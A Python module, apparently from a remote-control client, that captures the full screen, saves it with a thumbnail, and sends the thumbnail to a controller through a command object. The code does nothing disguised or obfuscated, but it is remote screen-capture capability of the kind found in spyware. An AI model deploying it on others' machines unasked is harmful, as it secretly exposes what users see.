import os

from PIL import ImageGrab, Image

from core.Command import Command


class Screen(object):
    def __init__(self, command, client):
        self.__command = command
        self.__client = client
        self.__screen_file = 'screen.jpg'
        self.__screen_thumbnail_file = 'screen_thumbnail.jpg'

    def capture(self):
        # create the screen image
        img = ImageGrab.grab()
        img = img.convert('RGB')
        img.save(self.__screen_file)
        # create the thumbnail
        img = Image.open(self.__screen_file)
        w, h = img.size
        img.thumbnail((w // 10, h // 10))
        img.save(self.__screen_thumbnail_file)
        self.send()

    def send(self):
        command = Command()
        command.set_type(self.__command.get_type())
        command.set_target(self.__command.get_target())
        command.set_data_length(os.path.getsize(self.__screen_thumbnail_file))
        with open(self.__screen_thumbnail_file, 'rb') as f:
            command.set_data(f.read())
        self.__client.send_command(command)
